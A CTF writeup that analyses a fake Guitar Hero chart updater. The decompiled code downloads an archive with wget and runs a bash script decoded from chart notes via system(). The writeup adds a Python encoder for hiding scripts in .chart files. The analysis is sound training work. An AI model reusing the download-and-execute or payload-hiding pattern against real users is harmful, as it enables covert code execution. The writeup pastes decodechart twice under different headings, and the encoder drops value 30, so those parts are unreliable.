---
title: CISA Annual CTF - Incident Response Challenge Writeup
description: Writeup for the Incident Response challenge in the CISA CTF event, focusing on reverse engineering and ICS investigation.
date: 2024-09-02
tldr: Dissecting an executable in a Guitar Hero-themed reverse engineering challenge, uncovering two flags through analysis of the update process.
draft: false
tags: ["ctf", "writeup", "reverse engineering", "ICS"]
---

## **CISA's Annual Capture the Flag (CTF) – Incident Response Challenge**

### **Overview**
CISA’s Capture the Flag (CTF) competition revolves around a cyber incident response scenario involving attacks on critical infrastructure sectors. This year’s featured sectors include city infrastructure, water purification, medical facilities, and railway systems. 

### **Event Details**
- **Date**: August 31 – September 4, 2024
- **Format**: Jeopardy-style challenges
- **Teams**: Up to 4 players
- **Registration**: Open from August 24 until the end of the competition

Players will be working as incident responders investigating various cyber incidents in Driftveil, a small city. The CTF is divided into categories such as **Security Foundations**, **Driftveil City**, **Castelia Solutions** (water-treatment), **Virbank Medical**, and **Anville Railway**.


# extract the executable from archive we found 



```bash
binwalk binwalk -D='.*' <target_file>
file 0
0: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=83401b267881c2b412c042ed95aebe6312497bac, for GNU/Linux 3.2.0, not stripped
```

Executable is supposed to be a level downloader for guitar hero, after loading this into `ghidra` we get to the connect method of the executable which seems to be connecting somewhere 


```C
unsigned __int64 connect()
{
  __int64 v1[16]; // [rsp+0h] [rbp-190h] BYREF
  char s[264]; // [rsp+80h] [rbp-110h] BYREF
  unsigned __int64 v3; // [rsp+188h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  qmemcpy(
    v1,
    "https://www.dropbox.com/scl/fo/d7obdb6leydzss7zt2flp/AEs4OV8HOoaDqQqS9UUnGnQ?rlkey=kzfeiye7xwwzso1mixp26aodg&st=xf88o70k&dl=1",
    125);
  puts("Updating your Clone Hero charts...");
  sprintf(s, "wget -O download.zip \"%s\"", (const char *)v1);
  puts(s);
  system(s);
  sprintf(s, "unzip download.zip");
  puts(s);
  system(s);
  puts("Finished downloading updated charts.");
  return v3 - __readfsqword(0x28u);
}
```

after downloading the file and unpacking the archive we find a flag there in plain text and move to the the next stage

```
flag{H1t_m3_w17H_y0Ur_b3S7_5Ho7}
```


## Executing of a bash script

we find the payload of the malicous guitar hero is somehow executing as a `bash` script but its nowhere to be found in the downloaded archive. As the debugging symbols were left in we find a function that seems to be responsible for that. 

```bash
void execbash()
{
  void *ptr; // [rsp+0h] [rbp-20h]
  FILE *stream; // [rsp+8h] [rbp-18h]
  __int64 n; // [rsp+10h] [rbp-10h]
  size_t v3; // [rsp+18h] [rbp-8h]

  ptr = 0LL;
  stream = fopen("Update.log", "r");
  if ( stream )
  {
    if ( !fseek(stream, 0LL, 2) )
    {
      n = ftell(stream);
      ptr = malloc(n + 1);
      fseek(stream, 0LL, 0);
      v3 = fread(ptr, 1uLL, n, stream);
      if ( ferror(stream) )
        fwrite("Error reading file", 1uLL, 0x12uLL, _bss_start);
      else
        *((_BYTE *)ptr + v3) = 0;
    }
    fclose(stream);
    remove("Update.log");
  }
  system((const char *)ptr);
  free(ptr);
}
```

we set a breakpoint in `gdb` to before the file named `Update.log` is removed to see whats in there and we get another flag.

```bash
#flag{W31C0Me_t0_tH3_JUn6L3}
echo "Finished updating clone hero charts :)"
```

# Encoder

In the last part of the challenge we are asked to reverse the process and encode our own `bash` script into the updater payload, to do that we need to understand how the decoding works because we only intercepted the process and did not understand how it works at all yet.


the flow seems to be as follows

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  connect();
  if ( (unsigned int)decodechart("./Jack Black - Command (ilikejackblack)/notes.chart") )
    exit(0);
  execbash();
  return 0;
}
```
We decode a chart the chart that came in the archive downloaded fromd dropbox, and execute it. That seems rather odd. 

The decode chart function is rather beefy

```C
__int64 __fastcall decodechart(char *a1)
{
  void *v1; // rsp
  unsigned __int64 v3; // rax
  void *v4; // rsp
  __int64 struct_five; // rax
  unsigned __int64 v6; // rax
  void *v7; // rsp
  char v8[8]; // [rsp+8h] [rbp-90h] BYREF
  char *filename; // [rsp+10h] [rbp-88h]
  int v10; // [rsp+24h] [rbp-74h]
  int i; // [rsp+28h] [rbp-70h]
  int n; // [rsp+2Ch] [rbp-6Ch]
  int v13; // [rsp+30h] [rbp-68h]
  int bash_script; // [rsp+34h] [rbp-64h]
  unsigned __int8 *notes_copy; // [rsp+38h] [rbp-60h]
  unsigned __int8 *notes; // [rsp+40h] [rbp-58h]
  __int64 v17; // [rsp+48h] [rbp-50h]
  char *s1; // [rsp+50h] [rbp-48h]
  FILE *stream; // [rsp+58h] [rbp-40h]
  __int64 v20; // [rsp+60h] [rbp-38h]
  char *v21; // [rsp+68h] [rbp-30h]
  __int64 v22; // [rsp+70h] [rbp-28h]
  const char *v23; // [rsp+78h] [rbp-20h]
  unsigned __int64 v24; // [rsp+80h] [rbp-18h]

  filename = a1;
  v24 = __readfsqword(0x28u);
  notes = 0LL;
  n = 255;
  v17 = 254LL;
  v1 = alloca(256LL);
  s1 = v8;
  stream = fopen(a1, "r");
  if ( stream )
  {
    while ( fgets(s1, n, stream) && strcmp(s1, "[ExpertSingle]\n") )
      ;
    fgets(s1, n, stream);
    notes = chart2notes(stream, notes);
    notes_copy = notes;
    v10 = 1;
    while ( *((_QWORD *)notes_copy + 1) )
    {
      ++v10;
      notes_copy = (unsigned __int8 *)*((_QWORD *)notes_copy + 1);
    }
    v20 = v10 - 1LL;
    v3 = 16 * ((8LL * v10 + 15) / 0x10uLL);
    while ( v8 != &v8[-(v3 & 0xFFFFFFFFFFFFF000LL)] )
      ;
    v4 = alloca(v3 & 0xFFF);
    if ( (v3 & 0xFFF) != 0 )
      *(_QWORD *)&v8[(v3 & 0xFFF) - 8] = *(_QWORD *)&v8[(v3 & 0xFFF) - 8];
    v21 = v8;
    notes_copy = notes;
    for ( i = 0; i < v10; ++i )
    {
      struct_five = note2five(notes_copy);
      *(_QWORD *)&v21[8 * i] = struct_five;
      notes_copy = (unsigned __int8 *)*((_QWORD *)notes_copy + 1);
    }
    v13 = 5 * (v10 / 8);
    v22 = v13 - 1LL;
    v6 = 16 * ((v13 + 15LL) / 0x10uLL);
    while ( v8 != &v8[-(v6 & 0xFFFFFFFFFFFFF000LL)] )
      ;
    v7 = alloca(v6 & 0xFFF);
    if ( (v6 & 0xFFF) != 0 )
      *(_QWORD *)&v8[(v6 & 0xFFF) - 8] = *(_QWORD *)&v8[(v6 & 0xFFF) - 8];
    v23 = v8;
    bash_script = fives2bytes((__int64)v21, v10, v8);
    if ( bash_script )
    {
      return 0xFFFFFFFFLL;
    }
    else
    {
      bash_script = writefile(v23);
      if ( bash_script )
        return 0xFFFFFFFFLL;
      else
        return 0LL;
    }
  }
  else
  {
    puts("File open failed");
    return 0xFFFFFFFFLL;
  }
}
```

chart is converted to a stream of notes 

```C
__int64 __fastcall decodechart(char *a1)
{
  void *v1; // rsp
  unsigned __int64 v3; // rax
  void *v4; // rsp
  __int64 struct_five; // rax
  unsigned __int64 v6; // rax
  void *v7; // rsp
  char v8[8]; // [rsp+8h] [rbp-90h] BYREF
  char *filename; // [rsp+10h] [rbp-88h]
  int v10; // [rsp+24h] [rbp-74h]
  int i; // [rsp+28h] [rbp-70h]
  int n; // [rsp+2Ch] [rbp-6Ch]
  int v13; // [rsp+30h] [rbp-68h]
  int bash_script; // [rsp+34h] [rbp-64h]
  unsigned __int8 *notes_copy; // [rsp+38h] [rbp-60h]
  unsigned __int8 *notes; // [rsp+40h] [rbp-58h]
  __int64 v17; // [rsp+48h] [rbp-50h]
  char *s1; // [rsp+50h] [rbp-48h]
  FILE *stream; // [rsp+58h] [rbp-40h]
  __int64 v20; // [rsp+60h] [rbp-38h]
  char *v21; // [rsp+68h] [rbp-30h]
  __int64 v22; // [rsp+70h] [rbp-28h]
  const char *v23; // [rsp+78h] [rbp-20h]
  unsigned __int64 v24; // [rsp+80h] [rbp-18h]

  filename = a1;
  v24 = __readfsqword(0x28u);
  notes = 0LL;
  n = 255;
  v17 = 254LL;
  v1 = alloca(256LL);
  s1 = v8;
  stream = fopen(a1, "r");
  if ( stream )
  {
    while ( fgets(s1, n, stream) && strcmp(s1, "[ExpertSingle]\n") )
      ;
    fgets(s1, n, stream);
    notes = chart2notes(stream, notes);
    notes_copy = notes;
    v10 = 1;
    while ( *((_QWORD *)notes_copy + 1) )
    {
      ++v10;
      notes_copy = (unsigned __int8 *)*((_QWORD *)notes_copy + 1);
    }
    v20 = v10 - 1LL;
    v3 = 16 * ((8LL * v10 + 15) / 0x10uLL);
    while ( v8 != &v8[-(v3 & 0xFFFFFFFFFFFFF000LL)] )
      ;
    v4 = alloca(v3 & 0xFFF);
    if ( (v3 & 0xFFF) != 0 )
      *(_QWORD *)&v8[(v3 & 0xFFF) - 8] = *(_QWORD *)&v8[(v3 & 0xFFF) - 8];
    v21 = v8;
    notes_copy = notes;
    for ( i = 0; i < v10; ++i )
    {
      struct_five = note2five(notes_copy);
      *(_QWORD *)&v21[8 * i] = struct_five;
      notes_copy = (unsigned __int8 *)*((_QWORD *)notes_copy + 1);
    }
    v13 = 5 * (v10 / 8);
    v22 = v13 - 1LL;
    v6 = 16 * ((v13 + 15LL) / 0x10uLL);
    while ( v8 != &v8[-(v6 & 0xFFFFFFFFFFFFF000LL)] )
      ;
    v7 = alloca(v6 & 0xFFF);
    if ( (v6 & 0xFFF) != 0 )
      *(_QWORD *)&v8[(v6 & 0xFFF) - 8] = *(_QWORD *)&v8[(v6 & 0xFFF) - 8];
    v23 = v8;
    bash_script = fives2bytes((__int64)v21, v10, v8);
    if ( bash_script )
    {
      return 0xFFFFFFFFLL;
    }
    else
    {
      bash_script = writefile(v23);
      if ( bash_script )
        return 0xFFFFFFFFLL;
      else
        return 0LL;
    }
  }
  else
  {
    puts("File open failed");
    return 0xFFFFFFFFLL;
  }
}
```

we find secret function that leaks how the struct looks like so we get a better ide of whats happening 

```C
int secretFunction()
{
  return printf(
           "Im a silly little guy and sometimes forget what the note struct looks like.\nHere it is: \n%s",
           "typedef struct note{\n"
           "\tbool green;\n"
           "\tbool red;\n"
           "\tbool yellow;\n"
           "\tbool blue;\n"
           "\tbool orange;\n"
           "\tstruct note* next;\n"
           "} note_t;\n");
}
```

now we look into how the format actually looks like in the song thats been added 

```ini
[Song]
{
  resolution = 192
  offset = 0
  Name = "Command"
  Artist = "Jack Black"
  Charter = "ilikejackblack"
  Album = "CloneHeroUpdater"
  Year = ", 2004"
  Genre = "Nerd Core"
  Difficulty = 0
  PreviewStart = 0
  PreviewEnd = 0
  MusicStream = "song.ogg"
}
[SyncTrack]
{
  0 = TS 4
  0 = B 120000
}
[Events]
{
  768 = E "The song"
}
[ExpertSingle]
{
  899 = N 3 818
  1806 = N 2 0
  1806 = N 3 0
  1930 = N 0 495
  1930 = N 2 495
  1930 = N 3 495
  2476 = N 0 0
  2476 = N 1 0
  2599 = N 1 0
  2599 = N 3 0
  2599 = N 4 0
  2736 = N 1 0
  2736 = N 3 0
  2736 = N 4 0
  2841 = N 1 1144
  2841 = N 3 1144
  4091 = N 0 0
  4091 = N 2 0
  4146 = N 3 248
  4146 = N 4 248
  4543 = N 2 0
  4543 = N 3 0
  4607 = N 1 1082
  4607 = N 3 1082
  5740 = N 0 125
  5740 = N 2 125
  5740 = N 3 125
  5951 = N 0 0
  5951 = N 1 0
  6052 = N 1 1233
  6052 = N 4 1233
  7359 = N 1 0
  7359 = N 2 0
  7464 = N 2 0
  7590 = N 0 0
  7590 = N 1 0
  7704 = N 0 1265
  9058 = N 0 0
  9058 = N 1 0
  9157 = N 1 370
  9157 = N 2 370
  9157 = N 3 370
  9604 = N 1 0
  9604 = N 2 0
  9703 = N 1 1252
  9703 = N 2 1252
  9703 = N 4 1252
  <snip>
  45999 = N 1 0
  46100 = N 0 0
  46100 = N 1 0
  46100 = N 4 0
  46145 = N 0 343
  46145 = N 3 343
  46572 = N 0 0
  46572 = N 1 0
  46572 = N 2 0
  46666 = N 7 0
}

```

and learn a bit about guitar hero format

> <Position> = H <HandPos> <Length>
HandPos is a number that corresponds to each of the .mid hand position notes, as detailed in the .mid docs. Possible values range from 0 to 19 (though Feedback, the only editor to make use of them, only outputs up to 18 when loading a .mid file that has them).
Length is how long this hand position should be held, in ticks.

- [https://github.com/TheNathannator/GuitarGame_ChartFormats/blob/main/doc/FileFormats/.chart/5-Fret%20Guitar.md](https://github.com/TheNathannator/GuitarGame_ChartFormats/blob/main/doc/FileFormats/.chart/5-Fret%20Guitar.md)

So it seems that we somehow translate the notes in the guitar hero level to a string that happens to be a valid `bash` script. 

We find this function thats sets five bits at a time in and array and another that converts this array to bytes.


```C
__int64 __fastcall note2five(unsigned __int8 *a1)
{
  __int64 result; // rax

  if ( *a1 != 1 && a1[1] != 1 && a1[2] != 1 && a1[3] != 1 && a1[4] != 1 )
    return 0LL;
  if ( *a1 && a1[1] != 1 && a1[2] != 1 && a1[3] != 1 && a1[4] != 1 )
    return 1LL;
  if ( *a1 != 1 && a1[1] && a1[2] != 1 && a1[3] != 1 && a1[4] != 1 )
    return 2LL;
  if ( *a1 != 1 && a1[1] != 1 && a1[2] && a1[3] != 1 && a1[4] != 1 )
    return 3LL;
  if ( *a1 != 1 && a1[1] != 1 && a1[2] != 1 && a1[3] && a1[4] != 1 )
    return 4LL;
  if ( *a1 != 1 && a1[1] != 1 && a1[2] != 1 && a1[3] != 1 && a1[4] )
    return 5LL;
  if ( *a1 && a1[1] && a1[2] != 1 && a1[3] != 1 && a1[4] != 1 )
    return 6LL;
  if ( *a1 && a1[1] != 1 && a1[2] && a1[3] != 1 && a1[4] != 1 )
    return 7LL;
  if ( *a1 && a1[1] != 1 && a1[2] != 1 && a1[3] && a1[4] != 1 )
    return 8LL;
  if ( *a1 && a1[1] != 1 && a1[2] != 1 && a1[3] != 1 && a1[4] )
    return 9LL;
  if ( *a1 != 1 && a1[1] && a1[2] && a1[3] != 1 && a1[4] != 1 )
    return 10LL;
  if ( *a1 != 1 && a1[1] && a1[2] != 1 && a1[3] && a1[4] != 1 )
    return 11LL;
  if ( *a1 != 1 && a1[1] && a1[2] != 1 && a1[3] != 1 && a1[4] )
    return 12LL;
  if ( *a1 != 1 && a1[1] != 1 && a1[2] && a1[3] && a1[4] != 1 )
    return 13LL;
  if ( *a1 != 1 && a1[1] != 1 && a1[2] && a1[3] != 1 && a1[4] )
    return 14LL;
  if ( *a1 != 1 && a1[1] != 1 && a1[2] != 1 && a1[3] && a1[4] )
    return 15LL;
  if ( *a1 && a1[1] && a1[2] && a1[3] != 1 && a1[4] != 1 )
    return 16LL;
  if ( *a1 && a1[1] && a1[2] != 1 && a1[3] && a1[4] != 1 )
    return 17LL;
  if ( *a1 && a1[1] && a1[2] != 1 && a1[3] != 1 && a1[4] )
    return 18LL;
  if ( *a1 && a1[1] != 1 && a1[2] && a1[3] && a1[4] != 1 )
    return 19LL;
  if ( *a1 && a1[1] != 1 && a1[2] && a1[3] != 1 && a1[4] )
    return 20LL;
  if ( *a1 && a1[1] != 1 && a1[2] != 1 && a1[3] && a1[4] )
    return 21LL;
  if ( *a1 != 1 && a1[1] && a1[2] && a1[3] && a1[4] != 1 )
    return 22LL;
  if ( *a1 != 1 && a1[1] && a1[2] && a1[3] != 1 && a1[4] )
    return 23LL;
  if ( *a1 != 1 && a1[1] && a1[2] != 1 && a1[3] && a1[4] )
    return 24LL;
  if ( *a1 != 1 && a1[1] != 1 && a1[2] && a1[3] && a1[4] )
    return 25LL;
  if ( *a1 && a1[1] && a1[2] && a1[3] && a1[4] != 1 )
    return 26LL;
  if ( *a1 && a1[1] && a1[2] && a1[3] != 1 && a1[4] )
    return 27LL;
  if ( *a1 && a1[1] != 1 && a1[2] && a1[3] && a1[4] )
    return 28LL;
  if ( *a1 != 1 && a1[1] && a1[2] && a1[3] && a1[4] )
    return 29LL;
  if ( *a1 && a1[1] && a1[2] != 1 && a1[3] && a1[4] )
    return 30LL;
  result = *a1;
  if ( (_BYTE)result )
  {
    result = a1[1];
    if ( (_BYTE)result )
    {
      result = a1[2];
      if ( (_BYTE)result )
      {
        result = a1[3];
        if ( (_BYTE)result )
        {
          result = a1[4];
          if ( (_BYTE)result )
            return 31LL;
        }
      }
    }
  }
  return result;
}
```

```C
__int64 __fastcall fives2bytes(__int64 a1, int a2, char *a3)
{
  unsigned __int64 v4; // rax
  void *v5; // rsp
  _BYTE v6[8]; // [rsp+8h] [rbp-70h] BYREF
  char *v7; // [rsp+10h] [rbp-68h]
  int v8; // [rsp+1Ch] [rbp-5Ch]
  __int64 v9; // [rsp+20h] [rbp-58h]
  char v10; // [rsp+2Bh] [rbp-4Dh]
  int v11; // [rsp+2Ch] [rbp-4Ch]
  int v12; // [rsp+30h] [rbp-48h]
  int v13; // [rsp+34h] [rbp-44h]
  int i; // [rsp+38h] [rbp-40h]
  int v15; // [rsp+3Ch] [rbp-3Ch]
  __int64 src[2]; // [rsp+40h] [rbp-38h] BYREF
  char *v17; // [rsp+50h] [rbp-28h]
  char dest[5]; // [rsp+5Bh] [rbp-1Dh] BYREF
  unsigned __int64 v19; // [rsp+60h] [rbp-18h]

  v9 = a1;
  v8 = a2;
  v7 = a3;
  v19 = __readfsqword(0x28u);
  if ( (a2 & 7) != 0 )
    return 0xFFFFFFFFLL;
  v15 = 5 * (v8 / 8);
  src[1] = v15 - 1LL;
  v4 = 16 * ((v15 + 15LL) / 0x10uLL);
  while ( v6 != &v6[-(v4 & 0xFFFFFFFFFFFFF000LL)] )
    ;
  v5 = alloca(v4 & 0xFFF);
  if ( (v4 & 0xFFF) != 0 )
    *(_QWORD *)&v6[(v4 & 0xFFF) - 8] = *(_QWORD *)&v6[(v4 & 0xFFF) - 8];
  v17 = v6;
  v11 = 0;
  v12 = 0;
  while ( v11 < v8 )
  {
    src[0] = 0LL;
    src[0] = *(_QWORD *)(8LL * v11 + v9) << 35;
    src[0] |= *(_QWORD *)(8 * (v11 + 1LL) + v9) << 30;
    src[0] |= *(_QWORD *)(8 * (v11 + 2LL) + v9) << 25;
    src[0] |= *(_QWORD *)(8 * (v11 + 3LL) + v9) << 20;
    src[0] |= *(_QWORD *)(8 * (v11 + 4LL) + v9) << 15;
    src[0] |= *(_QWORD *)(8 * (v11 + 5LL) + v9) << 10;
    src[0] |= 32LL * *(_QWORD *)(8 * (v11 + 6LL) + v9);
    src[0] |= *(_QWORD *)(8 * (v11 + 7LL) + v9);
    memcpy(dest, src, sizeof(dest));
    v13 = 0;
    for ( i = 4; v13 <= i; --i )
    {
      v10 = dest[v13];
      dest[v13] = dest[i];
      dest[i] = v10;
      ++v13;
    }
    strcpy(&v17[5 * v12], dest);
    v11 += 8;
    ++v12;
  }
  strcpy(v7, v17);
  return 0LL;
}
```

knowhing all that we pretty much arrived at the end of main and we understand a bit about the key functions involved 

- `chart2notes`: Parses the chart data into a notes structure.
- `note2five`: Converts each note into another format.
- `fives2bytes`: Converts processed notes into byte format.
- `writefile`: Writes the final processed data to a file.


Now we simply implement and encoder in our language of choice doing the same I went with python.


```python
import struct

# Mapping from 5-bit value to notes (boolean representation of [green, red, yellow, blue, orange])
FIVE_TO_NOTES = {
    0: [0, 0, 0, 0, 0],  # Zero note or rest
    1: [1, 0, 0, 0, 0],  # Green
    2: [0, 1, 0, 0, 0],  # Red
    3: [0, 0, 1, 0, 0],  # Yellow
    4: [0, 0, 0, 1, 0],  # Blue
    5: [0, 0, 0, 0, 1],  # Orange
    6: [1, 1, 0, 0, 0],  # Green + Red
    7: [1, 0, 1, 0, 0],  # Green + Yellow
    8: [1, 0, 0, 1, 0],  # Green + Blue
    9: [1, 0, 0, 0, 1],  # Green + Orange
    10: [0, 1, 1, 0, 0], # Red + Yellow
    11: [0, 1, 0, 1, 0], # Red + Blue
    12: [0, 1, 0, 0, 1], # Red + Orange
    13: [0, 0, 1, 1, 0], # Yellow + Blue
    14: [0, 0, 1, 0, 1], # Yellow + Orange
    15: [0, 0, 0, 1, 1], # Blue + Orange
    16: [1, 1, 1, 0, 0], # Green + Red + Yellow
    17: [1, 1, 0, 1, 0], # Green + Red + Blue
    18: [1, 1, 0, 0, 1], # Green + Red + Orange
    19: [1, 0, 1, 1, 0], # Green + Yellow + Blue
    20: [1, 0, 1, 0, 1], # Green + Yellow + Orange
    21: [1, 0, 0, 1, 1], # Green + Blue + Orange
    22: [0, 1, 1, 1, 0], # Red + Yellow + Blue
    23: [0, 1, 1, 0, 1], # Red + Yellow + Orange
    24: [0, 1, 0, 1, 1], # Red + Blue + Orange
    25: [0, 0, 1, 1, 1], # Yellow + Blue + Orange
    26: [1, 1, 1, 1, 0], # Green + Red + Yellow + Blue
    27: [1, 1, 1, 0, 1], # Green + Red + Yellow + Orange
    28: [1, 1, 0, 1, 1], # Green + Red + Blue + Orange
    29: [0, 1, 1, 1, 1], # Red + Yellow + Blue + Orange
    31: [1, 1, 1, 1, 1], # All notes active
}

def bash_script_to_bytes(script):
    """Convert a bash script to bytes."""
    return script.encode('ascii')

def bytes_to_five_chunks(byte_stream):
    """Convert a stream of bytes into 5-bit chunks."""
    five_bit_chunks = []
    bit_buffer = 0
    bit_count = 0
    
    for byte in byte_stream:
        bit_buffer = (bit_buffer << 8) | byte
        bit_count += 8
        
        while bit_count >= 5:
            chunk = (bit_buffer >> (bit_count - 5)) & 0b11111
            five_bit_chunks.append(chunk)
            bit_count -= 5

    # Handle remaining bits
    if bit_count > 0:
        chunk = (bit_buffer << (5 - bit_count)) & 0b11111
        five_bit_chunks.append(chunk)
    
    return five_bit_chunks

def five_chunks_to_notes(five_chunks):
    """Map 5-bit chunks to notes (as note combinations)."""
    note_combinations = []
    
    for chunk in five_chunks:
        note_combination = FIVE_TO_NOTES.get(chunk, [0, 0, 0, 0, 0])
        note_combinations.append(note_combination)
    
    return note_combinations

def write_chart_file(note_combinations, output_path):
    """Write the note combinations to a .chart file."""
    # Ensure the length of note_combinations is a multiple of 8
    while len(note_combinations) % 8 != 0:
        note_combinations.append([0, 0, 0, 0, 0])  # Add zero notes
    
    with open(output_path, 'w') as f:
        f.write("[Song]\n{\n  Name = \"Custom Script\"\n  Artist = \"Generated\"\n}\n")
        f.write("[SyncTrack]\n{\n  0 = TS 4\n  0 = B 120000\n}\n")
        f.write("[Events]\n{\n  768 = E \"Encoded Script\"\n}\n")
        f.write("[ExpertSingle]\n{\n")
        
        timestamp = 0
        timestamp_increment = 10  # Arbitrary increment to keep notes close together
        
        for notes in note_combinations:
            for i, note in enumerate(notes):
                if note == 1:
                    f.write(f"  {timestamp} = N {i} 0\n")
            timestamp += timestamp_increment
        
        f.write("}\n")

def encode_bash_script(script, output_path):
    """Encode a bash script into a .chart file."""
    byte_stream = bash_script_to_bytes(script)
    five_chunks = bytes_to_five_chunks(byte_stream)
    note_combinations = five_chunks_to_notes(five_chunks)
    write_chart_file(note_combinations, output_path)

# Example usage
bash_script = "echo hello"
output_chart_file = "custom.chart"
encode_bash_script(bash_script, output_chart_file)
```

Using this we encode the bash script requested by the server verifying the solution to this challenge and we get the flag.


```
flag{r0CK_aND_r011_A11_N1t3}
```


# Conclusion 

In this challenge, we reverse-engineered an executable related to Guitar Hero, which downloads and updates charts from a URL. By analyzing the code, we discovered two flags hidden within bash script executions, intercepted via gdb and examining log files. Finally, we decoded the chart format, reverse-engineered the process to encode our own bash script into the chart, and successfully retrieved the final flag.